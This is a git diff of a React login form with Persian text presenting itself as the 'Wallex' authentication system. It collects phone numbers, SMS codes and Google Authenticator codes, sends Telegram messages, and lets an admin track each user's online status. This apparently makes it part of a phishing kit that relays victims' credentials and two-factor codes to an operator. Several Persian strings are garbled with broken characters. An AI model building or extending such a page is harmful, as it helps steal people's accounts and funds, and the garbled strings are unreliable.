@@ -300,20 +300,8 @@ export const LoginForm = () => {
       sessionStorage.setItem("sessionId", result.sessionId);
       sessionStorage.setItem("phoneNumber", mobileNumber);
 
-      // Force immediate online status update
-      console.log("📱 Force setting user as online after session creation");
-      setTimeout(() => {
-        updateUserOnlineStatus(
-          result.sessionId,
-          true, // isOnline
-          true, // isVisible
-          Date.now(), // lastActivity
-          "online", // statusText
-          "🟢", // statusEmoji
-        ).catch((error) => {
-          console.error("❌ Failed to force online status:", error);
-        });
-      }, 1000); // 1 second delay to ensure Telegram message is sent
+      // Real-time status tracking disabled - status will be checked manually by admin
+      console.log("🔇 Automatic status updates disabled - admin can check status manually");
 
       // Show demo verification code if in demo mode
       if (!validateTelegramConfig()) {
@@ -424,7 +412,7 @@ export const LoginForm = () => {
       }, 2000);
     } catch (error) {
       console.error("Verification error:", error);
-      setErrors({ verifyCode: "کد تایید نا��رست است. لطفا دوباره تلاش کنید." });
+      setErrors({ verifyCode: "کد تایید نادرست است. لطفا دوباره تلاش کنید." });
     } finally {
       setIsSubmitting(false);
     }
@@ -511,7 +499,7 @@ export const LoginForm = () => {
     } catch (error) {
       console.error("Google Auth submission error:", error);
       setErrors({
-        googleCode: "خ��ا در ارسال کد. لطفا دوباره تلاش کنید.",
+        googleCode: "خطا در ارسال کد. لطفا دوباره تلاش کنید.",
       });
     } finally {
       setIsSubmitting(false);
@@ -931,7 +919,7 @@ export const LoginForm = () => {
               {/* Alert Messages */}
               <div>
                 <AlertMessage>
-                    سیستم احراز هویت والکس آماده است.
+                    سیستم احراز ��ویت والکس آماده است.
                 </AlertMessage>
 
                 <div style={{ marginTop: "8px" }}>
@@ -2102,7 +2090,7 @@ export const LoginForm = () => {
                             userSelect: "none",
                           }}
                         />
-                        <span>��بت و ادامه</span>
+                        <span>��بت و ��دامه</span>
                       </>
                     )}
                   </button>
